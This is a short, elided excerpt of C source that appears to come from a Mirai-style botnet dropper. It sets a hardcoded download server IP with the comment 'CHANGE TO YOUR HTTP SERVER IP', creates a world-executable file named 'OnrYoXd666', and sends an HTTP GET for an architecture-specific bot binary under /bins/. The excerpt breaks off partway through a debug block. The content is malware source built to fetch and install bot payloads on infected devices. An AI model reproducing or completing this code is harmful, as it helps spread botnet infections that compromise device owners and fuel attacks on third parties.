...
#define HTTP_SERVER utils_inet_addr(116,93,120,93) // CHANGE TO YOUR HTTP SERVER IP
...
inline void run(void)
{
    ...
    ffd = open("OnrYoXd666", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/onryo." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
